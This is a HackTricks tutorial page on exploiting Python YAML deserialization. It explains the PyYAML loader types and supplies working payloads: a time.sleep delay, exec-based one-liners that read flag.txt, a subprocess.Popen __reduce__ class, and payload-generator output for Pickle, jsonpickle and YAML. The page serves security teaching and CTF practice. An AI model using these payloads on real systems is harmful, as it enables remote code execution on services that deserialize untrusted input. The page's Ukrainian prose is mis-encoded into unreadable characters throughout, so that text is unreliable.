# Python Yaml Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Yaml **Deserialization**

**Yaml** –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ python —Ç–∞–∫–æ–∂ –∑–¥–∞—Ç–Ω—ñ **—Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ python –æ–±'—î–∫—Ç–∏** —ñ –Ω–µ –ª–∏—à–µ —Å–∏—Ä—ñ –¥–∞–Ω—ñ:
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ **tuple** –Ω–µ —î —Å–∏—Ä–∏–º —Ç–∏–ø–æ–º –¥–∞–Ω–∏—Ö, —ñ —Ç–æ–º—É –≤—ñ–Ω –±—É–≤ **—Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π**. –Ü —Ç–µ –∂ —Å–∞–º–µ —Å—Ç–∞–ª–æ—Å—è –∑ **range** (–≤–∑—è—Ç–æ –∑ –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö).

![](<../../.gitbook/assets/image (1040).png>)

**safe\_load()** –∞–±–æ **safe\_load\_all()** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å SafeLoader —ñ **–Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é –æ–±'—î–∫—Ç—ñ–≤ –∫–ª–∞—Å—É**. –ü—Ä–∏–∫–ª–∞–¥ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –æ–±'—î–∫—Ç—ñ–≤ –∫–ª–∞—Å—É:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∫–æ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ **unsafe\_load** –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –∫–ª–∞—Å—É python. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ –≤ **–≤–µ—Ä—Å—ñ—ó >= 5.1** –≤—ñ–Ω –Ω–µ –¥–æ–∑–≤–æ–ª—è—î **–¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –∂–æ–¥–µ–Ω —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –∫–ª–∞—Å python –∞–±–æ –∞—Ç—Ä–∏–±—É—Ç –∫–ª–∞—Å—É**, —è–∫—â–æ Loader –Ω–µ –≤–∫–∞–∑–∞–Ω–æ –≤ load() –∞–±–æ Loader=SafeLoader.

### Basic Exploit

–ü—Ä–∏–∫–ª–∞–¥ —Ç–æ–≥–æ, —è–∫ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–∞—Ç—Ä–∏–º–∫—É**:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
### –£—Ä–∞–∑–ª–∏–≤–∏–π .load("\<content>") –±–µ–∑ Loader

**–°—Ç–∞—Ä—ñ –≤–µ—Ä—Å—ñ—ó** pyyaml –±—É–ª–∏ —É—Ä–∞–∑–ª–∏–≤—ñ –¥–æ –∞—Ç–∞–∫ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —è–∫—â–æ –≤–∏ **–Ω–µ –≤–∫–∞–∑–∞–ª–∏ Loader** –ø—ñ–¥ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —á–æ–≥–æ—Å—å: `yaml.load(data)`

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–æ–ø–∏—Å —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç—É—Ç**](https://hackmd.io/@defund/HJZajCVlP)**.** –ó–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–π **–µ–∫—Å–ø–ª–æ–π—Ç** –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
–ê–±–æ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π **–æ–¥–Ω–æ—Ä—è–¥–∫–æ–≤–∏–π –∫–æ–¥, –Ω–∞–¥–∞–Ω–∏–π @ishaack**:
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ **–æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤–µ—Ä—Å—ñ—è—Ö** –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ **–±—ñ–ª—å—à–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `.load()`** **–±–µ–∑ `Loader`** —ñ **`FullLoader`** **–±—ñ–ª—å—à–µ –Ω–µ –≤—Ä–∞–∑–ª–∏–≤–∏–π** –¥–æ —Ü—ñ—î—ó –∞—Ç–∞–∫–∏.

## RCE

–ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–∂—É—Ç—å –±—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Python YAML –º–æ–¥—É–ª—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ **PyYAML** –∞–±–æ **ruamel.yaml**. –¶—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–∂—É—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ —Å–∏—Å—Ç–µ–º–∞—Ö, —è–∫—ñ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É—é—Ç—å –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏–π –≤—Ö—ñ–¥ –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ—ó —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó.
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è Payloads

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó python deserialization payloads –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è **Pickle, PyYAML, jsonpickle —Ç–∞ ruamel.yaml:**
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
### References

* [https://www.exploit-db.com/docs/ukrainian/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/ukrainian/47655-yaml-deserialization-attack-in-python.pdf)
* [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
